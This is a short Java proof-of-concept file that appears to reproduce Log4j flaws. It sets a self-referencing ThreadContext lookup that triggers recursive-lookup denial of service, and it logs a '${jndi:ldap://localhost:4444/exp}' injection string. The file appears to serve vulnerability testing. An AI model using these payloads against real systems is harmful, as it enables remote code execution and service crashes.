import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.ThreadContext;

public class Vuln2 {
    private static final Logger logger = LogManager.getLogger(Vuln2.class);
    public static void main(String[] args) throws Exception {
        // Have an appender that reads myvar configured like
        // appender.console.layout.pattern = ${ctx:myvar} - %m%n
        ThreadContext.put("myvar", "${${ctx:myvar}}");
        logger.error("Any string");
        logger.error("${jndi:ldap://localhost:4444/exp}");
    }
}
